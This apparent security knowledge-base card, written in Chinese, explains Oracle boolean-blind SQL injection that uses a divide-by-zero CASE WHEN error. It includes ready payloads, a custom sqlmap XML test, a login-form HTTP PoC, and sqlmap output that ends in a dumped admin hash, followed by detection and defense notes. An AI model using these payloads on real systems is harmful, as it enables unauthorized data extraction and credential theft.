---
id: web-generic-sqli-oracle-case-divzero-error-boolean-oracle
title: Oracle 用 1/0 除零报错当布尔 oracle：CASE WHEN 条件 THEN 1 ELSE 1/0，并注册为 sqlmap 自定义 boolean_blind payload 提速
type: scenario
domain: web
path: web/generic/sqli
technique: oracle-case-divide-by-zero-boolean-blind-oracle
tags:
- sqli
- oracle
- boolean-blind
- error-based
- divide-by-zero
- case-when
- sqlmap
- payload-customization
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V539
  verified_at: '2026-11-11T19:00:21+08:00'
  notes: 已对照原文 content.md 与全部 11 张图逐项核对：时间盲注不稳定日志 invalid character/connection dropped（图09）、自定义 boolean_blind <test> 模板与原文一致、sqlmap 识别 boolean-based blind + Title Oracle AND boolean-based blind - (custom) 及 1/0 CASE payload（图10）、最终 dump admin 口令哈希（图11）均一致。验证中修正：手工验证请求不应带 sqlmap 注入点标记 *，改为 UserName=1' 并加说明（sqlmap 输出块保留 1*' 原样）。affected_versions 按原文未标版本省略正确。dedup new，related 为大小写陷阱布尔盲注与 XOR 时间盲注 oracle，均为不同 oracle 构造；与同文章 queries.xml 适配卡为前后步骤、不同技术点，已互链。未验证点：PoC 未复跑；ORA-01476 行为与页面差异依赖具体 Oracle/应用实现。
url: /docs/web/generic/sqli/web-generic-sqli-oracle-case-divzero-error-boolean-oracle/
draft: false
kb_aliases:
- Oracle 1/0 布尔盲注
- 除零报错布尔盲注
- CASE WHEN 1/0
- sqlmap 自定义 boolean_blind
- 时间盲注转布尔盲注
---

## 一句话结论

当 Oracle 注入点同时存在“正常页”和“数据库报错页”两种可区分响应时，可以用 `AND [RANDNUM]=(CASE WHEN ([条件]) THEN 1 ELSE 1/0 END)` 把条件真假映射为“正常/除零报错”：条件真时返回正常页，假时 Oracle 抛 ORA-01476 触发错误页（MySQL 的 `1/0` 返回 NULL 不报错，因此该技巧是 Oracle 特有）；把这条 `<test>` 加进 sqlmap 的 `data/xml/payloads/boolean_blind.xml` 后，sqlmap 会把原本低效、易受网络抖动影响的时间盲注自动切换成稳定的布尔盲注拖库。

## 原理

- **布尔盲注只需要二元信号**：条件为真/假时页面不同即可逐字符推断数据。时间盲注用“是否延迟”作信号，但受网络抖动、数据库负载影响大，原文在长时间拖库时频繁出现 `invalid character detected`、连接中断、字符校验失败。
- **Oracle 的除零特性**：`1/0` 在 Oracle 中抛出 `ORA-01476: divisor is equal to zero`，语句失败并进入应用的数据库错误处理分支；而 MySQL 中 `1/0` 返回 NULL 不报错。因此 `1/0` 可作为 Oracle 专用的“制造错误”原语。
- **CASE 把条件映射为错误**：`CASE WHEN (cond) THEN 1 ELSE 1/0 END` 在条件为真时返回 1（正常），为假时执行 `1/0` 触发错误；配合 `AND [RANDNUM]=(...)` 保持语句语法与恒真/恒假结构，形成稳定的布尔 oracle。
- **页面差异来源**：原文目标在 SQL 报错时返回 ASP.NET 错误跳转页（`Object moved` → `/Error?aspxerrorpath=...`），正常时返回 JSON 错误提示（`用户名输入错误或者您已经被禁用`）；这种结构性差异让布尔判断非常可靠。
- **为什么要改 sqlmap XML**：sqlmap 默认没有“Oracle 除零报错布尔盲注”这种检测项；在 `data/xml/payloads/boolean_blind.xml` 增加一个 `<test>`，声明 `stype=1`（布尔盲注）、`dbms=Oracle`，并提供 `vector` 与 request/response 对比模板，sqlmap 即可自动识别并采用该技术取数。

## 触发条件

- 存在 Oracle 后端 SQL 注入点（原文为 POST 参数，时间盲注已确认）。
- 应用的数据库报错页与正常页存在可稳定区分的差异（状态码、跳转、页面结构或文案）；若报错被统一吞掉、两页完全一致，则该方法不成立。
- 注入上下文允许拼接 `AND ...` 布尔表达式（字符串/数字均可，按闭合调整）。
- 使用 sqlmap 时需能编辑本地 `data/xml/payloads/boolean_blind.xml`；手工注入则无需。

## 利用步骤

1. 先确认注入点与响应差异：分别发送会报错的语句（如含 `v$version` 或 `1/0`）和正常语句，记录错误页/正常页特征。
2. 手工验证布尔 oracle：
   ```sql
   ' AND 6879=(CASE WHEN (6879=6879) THEN 6879 ELSE 1/0 END) AND 'WXof'='WXof
   ```
   条件恒真应返回正常页；把条件改为恒假（如 `6879=6878`）应出现报错页。
3. 在 sqlmap 的 `data/xml/payloads/boolean_blind.xml` 中加入自定义测试项（原文模板，`[INFERENCE]` 由 sqlmap 替换为判断条件）：
   ```xml
   <test>
       <title>Oracle AND boolean-based blind - (custom)</title>
       <stype>1</stype>
       <level>1</level>
       <risk>1</risk>
       <clause>1</clause>
       <where>1</where>
       <vector> AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN 1 ELSE 1/0 END)</vector>
       <request>
           <payload> AND  [RANDNUM]=(CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE  1/0 END )</payload>
       </request>
       <response>
           <comparison> AND  [RANDNUM]=(CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE  1/0 END) </comparison>
       </response>
       <details>
           <dbms>Oracle</dbms>
       </details>
   </test>
   ```
4. 用 sqlmap 重新识别/取数（必要时指定 `--technique=B`、`--dbms=Oracle`），确认输出 `Type: boolean-based blind`、`Title: Oracle AND boolean-based blind - (custom)`。
5. sqlmap 按该 payload 逐字符判断，稳定拖出表、列与数据（原文最终 dump 出 `admin` 账户与口令哈希）。
6. 若目标改版导致页面差异变化，重新校准 request/response 对比模板或改回手工布尔/时间盲注。

## PoC

手工验证请求（原文参数名）：

```http
POST /Login/CheckUser HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

Code=3189&Password=111&UserName=1' AND 6879=(CASE WHEN (6879=6879) THEN 6879 ELSE 1/0 END) AND 'WXof'='WXof
```

- 手工发送时不要带 `*`：`*` 是 sqlmap 标记注入点的记法（下方 sqlmap 输出中原样保留），手工验证用 `1'` 闭合即可。
- 恒真：正常 JSON 响应；恒假：Oracle `ORA-01476` 触发错误跳转页。
- sqlmap 识别结果（原文）：
  ```text
  Parameter: UserName (POST)
  Type: boolean-based blind
  Title: Oracle AND boolean-based blind - (custom)
  Payload: Code=3189&Password=111&UserName=1*'  AND 6879=(CASE WHEN (6879=6879) THEN 6879 ELSE  1/0 END ) AND 'WXof'='WXof
  ```
- 最终 dump 示例：`[1 entry] NAME=admin, PASSWORD=QwJgAGsCYQhkCj4IPQowADMCMWBoAmE...`（Oracle 口令哈希）。

## 变体与关联

- 变体：`1/0` 被过滤时，可换其他能稳定触发 Oracle 错误的表达式（如非法类型转换、越界函数参数），保持 `CASE WHEN cond THEN <正常值> ELSE <错误表达式> END` 结构。
- 变体：不依赖 CASE 的布尔盲注（`AND 1=1`/`AND 1=2` 页面差异）在无过滤时更简单；本卡针对的是需要“制造报错差异”的目标。
- 关联：[[web-generic-sqli-blind-filter-bypass-functions]]（IF/SLEEP 被过滤时的 CASE WHEN 等替代原语）；[[web-generic-sqli-exists-left-boolean-oracle]]（以正常/异常回显为布尔 oracle 的通用思路）；[[web-generic-sqli-dameng-dmsql-error-boolean-oob-systables]]（达梦用除零/exp 溢出报错做布尔的同族技巧，DBMS 不同）；[[web-generic-sqli-sqlmap-oracle-queries-xml-function-replacement]]（同一文章先修 queries.xml 才能取数）。
- 边界：页面无差异、报错被统一处理、注入点不能拼 AND 布尔表达式时不成立；`1/0` 是 Oracle 特性，其他 DBMS 需换对应错误原语。

## 检测与防御

- 检测：请求参数中出现 `1/0`、`CASE WHEN`、`ORA-01476` 相关响应；同一参数高频请求且正常页与错误页交替出现；sqlmap 自定义 payload 的固定模板（`[RANDNUM]=(CASE WHEN ... THEN ... ELSE 1/0 END)`）也可能出现在流量中。
- 检测：数据库审计日志中出现 `CASE WHEN`、除零错误、逐字符 `SUBSTR/ASCII` 查询组合。
- 防御：参数化查询；应用捕获数据库异常并返回统一错误页，不区分“SQL 报错/正常”两种结构，破坏布尔 oracle；关闭数据库错误详情回显。
- 防御：WAF 对 `1/0`、`CASE WHEN`、`ORA-01476`、`DBMS_PIPE` 等特征做检测，并注意编码/注释绕过。
